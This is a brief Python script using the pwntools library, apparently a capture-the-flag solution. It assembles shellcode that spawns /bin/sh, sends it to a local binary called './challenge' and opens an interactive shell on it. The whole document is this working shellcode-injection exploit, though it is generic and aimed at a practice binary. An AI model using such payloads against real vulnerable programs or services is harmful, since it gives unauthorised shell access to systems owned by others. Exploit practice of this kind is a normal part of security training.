from pwn import *

elf = context.binary = ELF('./challenge')

payload = asm(shellcraft.sh())

p = process()
p.send(payload)
p.interactive()
